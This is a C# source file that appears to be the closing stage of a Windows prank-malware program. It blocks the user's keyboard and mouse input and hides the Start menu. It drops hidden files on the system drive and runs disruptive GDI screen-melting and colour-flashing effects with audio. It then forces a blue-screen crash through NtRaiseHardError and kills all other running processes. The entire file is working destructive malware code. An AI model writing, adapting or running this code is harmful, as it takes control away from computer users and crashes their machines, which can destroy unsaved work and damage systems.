using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class FinalPhase
{
    [DllImport("winmm.dll")]
    private static extern uint mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hWndCallback);

    [DllImport("ntdll.dll")]
    private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

    [DllImport("ntdll.dll")]
    private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("user32.dll")]
    private static extern bool SetWindowText(IntPtr hWnd, string text);

    public static void StartFinalPhase()
    {
        Utils.HideStartMenu();
        BlockInput(true);
        DoInfinityWindow();
        DoColoredMeltingScreen();
        DoRadialBlurGDI();
        DoInfinitySoundGDI();
        TriggerBSOD();
    }

    public static void DoColoredMeltingScreen()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllBytes(rootDir + "\\windowsxpsad.mp3", Windows_6.Properties.Resources.windowsxpsad);
        mciSendString("close infinity", null, 0, IntPtr.Zero);
        mciSendString("open \"" + rootDir + "\\windowsxpsad.mp3\" alias windowsxpsad", null, 0, IntPtr.Zero);
        mciSendString("play windowsxpsad", null, 0, IntPtr.Zero);

        int steps = 0;
        int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right,
            top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
        uint[] colors = new uint[] { 0xFF0000, 0xFF00BC, 0xFF700, 0x00FFEF };
        int coloredSteps = 15;

        while (steps <= 1000)
        {
            {
                IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
                IntPtr mhdc = GDICore.CreateCompatibleDC(hdc);
                IntPtr hbit = GDICore.CreateCompatibleBitmap(hdc, x, y);
                IntPtr holdbit = GDICore.SelectObject(mhdc, hbit);
                byte[] bits = { 0xFF, 0xFF, 0xC3, 0xC3, 0xC3, 0xC3, 0xFF, 0xFF };
                IntPtr bitmap = GDICore.CreateBitmap(8, 8, 1, 1, IntPtr.Zero);
                IntPtr brush = GDICore.CreateSolidBrush(colors[1]);
                int rand = Utils.random.GetRandomInt32(0, y);
                GDICore.BitBlt(hdc, rand, Utils.random.GetRandomInt32(-4, 4), Utils.random.GetRandomInt32(0, 100), y, hdc, rand, 0, GDICore.TernaryRasterOperations.SRCCOPY);
                GDICore.DeleteDC(hdc);
            }

            {
                if (coloredSteps == 0)
                {
                    IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
                    IntPtr brush = GDICore.CreateSolidBrush(colors[Utils.random.GetRandomInt32(0, colors.Length - 1)]);
                    GDICore.SelectObject(hdc, brush);
                    GDICore.PatBlt(hdc, 0, 0, x, y, GDICore.TernaryRasterOperations.PATINVERT);
                    GDICore.DeleteObject(brush);
                    GDICore.DeleteObject(hdc);
                    coloredSteps = 15;
                }
                else
                {
                    coloredSteps--;
                }
            }

            Thread.Sleep(10);
            steps++;
        }

        mciSendString("pause windowsxpsad", null, 0, IntPtr.Zero);
        mciSendString("stop windowsxpsad", null, 0, IntPtr.Zero);
    }

    public static void DoRadialBlurGDI()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllBytes(rootDir + "\\radialblur.mp3", Windows_6.Properties.Resources.radialblur);
        mciSendString("close radialblur", null, 0, IntPtr.Zero);
        mciSendString("open \"" + rootDir + "\\radialblur.mp3\" alias radialblur", null, 0, IntPtr.Zero);
        mciSendString("play radialblur repeat", null, 0, IntPtr.Zero); 
        
        int steps = 0;
        int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right,
            top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
        uint[] colors = new uint[] { 0xFF0000, 0xFF00BC, 0xFF700, 0x00FFEF };
        int coloredSteps = 3;
        GDICore.POINT[] thePoints = new GDICore.POINT[3];

        while (steps <= 50)
        {
            {
                IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
                IntPtr mhdc = GDICore.CreateCompatibleDC(hdc);
                IntPtr hbit = GDICore.CreateCompatibleBitmap(hdc, x, y);
                IntPtr holdbit = GDICore.SelectObject(mhdc, hbit);

                if (Utils.random.GetRandomBoolean())
                {
                    thePoints[0].X = left + 50;
                    thePoints[0].Y = top - 50;

                    thePoints[1].X = right + 50;
                    thePoints[1].Y = top + 50;

                    thePoints[2].X = left - 50;
                    thePoints[2].Y = bottom - 50;
                }
                else
                {
                    thePoints[0].X = left - 50;
                    thePoints[0].Y = top + 50;

                    thePoints[1].X = right - 50;
                    thePoints[1].Y = top - 50;

                    thePoints[2].X = left + 50;
                    thePoints[2].Y = bottom + 50;
                }

                GDICore.PlgBlt(mhdc, thePoints, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
                GDICore.AlphaBlend(hdc, 0, 0, x, y, mhdc, 0, 0, x, y, new GDICore.BLENDFUNCTION(0, 0, 50, 0));
                GDICore.SelectObject(mhdc, holdbit);
                GDICore.DeleteDC(holdbit);
                GDICore.DeleteDC(hbit);
                GDICore.DeleteDC(mhdc);
                GDICore.DeleteDC(hdc);
            }

            {
                if (coloredSteps == 0)
                {
                    IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
                    IntPtr brush = GDICore.CreateSolidBrush(colors[Utils.random.GetRandomInt32(0, colors.Length - 1)]);
                    GDICore.SelectObject(hdc, brush);
                    GDICore.PatBlt(hdc, 0, 0, x, y, GDICore.TernaryRasterOperations.PATINVERT);
                    GDICore.DeleteObject(brush);
                    GDICore.DeleteObject(hdc);
                    coloredSteps = 3;
                }
                else
                {
                    coloredSteps--;
                }
            }

            Thread.Sleep(250);
            steps++;
        }

        mciSendString("pause radialblur", null, 0, IntPtr.Zero);
        mciSendString("stop radialblur", null, 0, IntPtr.Zero);
    }

    public static void DoInfinitySoundGDI()
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        System.IO.File.WriteAllBytes(rootDir + "\\infinity.mp3", Windows_6.Properties.Resources.infinity);
        mciSendString("close infinity", null, 0, IntPtr.Zero);
        mciSendString("open \"" + rootDir + "\\infinity.mp3\" alias infinity", null, 0, IntPtr.Zero);
        mciSendString("play infinity", null, 0, IntPtr.Zero);

        int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
        int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right,
            top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
        GDICore.POINT[] thePoints = new GDICore.POINT[3];
        uint[] colors = new uint[] { 0xFF0000, 0xFF00BC, 0xFF700, 0x00FFEF };
        int steps = 0;

        while (steps <= 80)
        {
            IntPtr hdc = GDICore.GetDC(IntPtr.Zero);
            IntPtr mhdc = GDICore.CreateCompatibleDC(hdc);
            IntPtr hbit = GDICore.CreateCompatibleBitmap(hdc, x, y);
            IntPtr holdbit = GDICore.SelectObject(mhdc, hbit);
            thePoints[0].X = left + 50;
            thePoints[0].Y = top - 50;
            thePoints[1].X = right + 50;
            thePoints[1].Y = top + 50;
            thePoints[2].X = left - 50;
            thePoints[2].Y = bottom - 50;
            GDICore.PlgBlt(hdc, thePoints, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
            GDICore.DeleteDC(hdc);

            hdc = GDICore.GetDC(IntPtr.Zero);
            IntPtr brush = GDICore.CreateSolidBrush(colors[Utils.random.GetRandomInt32(0, colors.Length - 1)]);
            GDICore.SelectObject(hdc, brush);
            GDICore.PatBlt(hdc, 0, 0, x, y, GDICore.TernaryRasterOperations.PATINVERT);
            GDICore.DeleteObject(brush);
            GDICore.DeleteObject(hdc);

            Thread.Sleep(230);
            steps++;
        }
    }

    public static void TriggerBSOD()
    {
        try
        {
            Boolean t1;
            uint t2;

            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
        catch
        {

        }

        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                if (process.Id != Process.GetCurrentProcess().Id)
                {
                    try
                    {
                        process.PriorityClass = ProcessPriorityClass.BelowNormal;
                    }
                    catch
                    {

                    }

                    try
                    {
                        process.Kill();
                    }
                    catch
                    {

                    }
                }
            }
            catch
            {

            }
        }

        try
        {
            Process.GetCurrentProcess().Kill();
        }
        catch
        {

        }
    }

    public static void DoInfinityWindow()
    {
        try
        {
            string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
            System.IO.File.WriteAllText(rootDir + "\\MatrixEffect2.bat", Windows_6.Properties.Resources.MatrixEffect);
            System.IO.File.SetAttributes(rootDir + "\\MatrixEffect2.bat", System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);

            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c \"" + rootDir + "\\MatrixEffect2.bat\"");
            processInfo.CreateNoWindow = false;
            processInfo.UseShellExecute = false;
            Process process = Process.Start(processInfo);

            while (process.MainWindowHandle.ToInt32() == 0)
            {
                Thread.Sleep(1);
            }

            MoveWindow(process.MainWindowHandle, 0, 0, 970, 500, true);

            for (int i = 0; i < 150; i++)
            {
                SetWindowText(process.MainWindowHandle, Utils.GenerateRandomConsoleTitle());
                Thread.Sleep(1);
            }

            process.Kill();
        }
        catch
        {

        }
    }
}